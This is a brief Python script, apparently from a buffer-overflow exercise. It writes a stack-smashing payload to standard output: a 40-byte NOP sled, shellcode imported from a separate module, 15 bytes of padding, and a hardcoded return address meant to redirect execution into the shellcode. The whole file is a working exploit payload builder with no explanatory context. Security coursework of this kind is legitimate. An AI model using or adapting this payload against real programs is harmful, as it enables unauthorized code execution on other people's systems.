import sys
from shellcode import shellcode

# Send bytes to output
data = b"\x90"*40 + shellcode + b"A"*15 + b"\xcd\xc9\xfe\xbf"
sys.stdout.buffer.write(data)

